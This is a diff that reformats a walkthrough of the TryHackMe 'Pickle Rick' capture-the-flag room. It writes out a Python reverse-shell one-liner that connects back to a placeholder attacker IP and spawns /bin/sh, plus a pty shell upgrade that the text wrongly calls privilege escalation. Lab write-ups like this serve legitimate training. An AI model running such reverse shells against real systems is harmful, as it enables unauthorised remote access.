@@ -44,7 +44,7 @@ TryHackMe - Pickle Rick CTF: [https://tryhackme.com/room/picklerick](https://try
 
 This box is listed as Easy .  All three ingredients can be discovered easily from your browser and without using any tools, but for this walkthrough I will be using:
 
-NMAP DIRBUSTER NETCAT
+> NMAP DIRBUSTER NETCAT
 
 I will try to provide alternative guidance where applicable.
 
@@ -126,7 +126,7 @@ Alternatively, we would have been able to 'less' the .txt files and gotten their
 
 At this point, we can continue to issue commands to the web browser panel.  However, for practice and ease of use, I chose to implement a reverse shell.  I started netcat on my machine, and listened on port 4444 (an arbitrary port).  I then issued the command
 
-\`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'\`
+> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 on the control panel, and was able to spawn the reverse shell:
 
@@ -140,7 +140,7 @@ Now we can explore the machine and look for our next ingredient:
 
 Awesome.  That's the second ingredient, and we only have one left.  Unfortunately, the last one needs root access, so let's practice our privilege escalation.  I'll use another python script to sudo bash:
 
-\`python3 -c 'import pty; pty.spawn("/bin/bash")'\`
+> python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Now we can cd to /root, and get into the third ingredient:
 
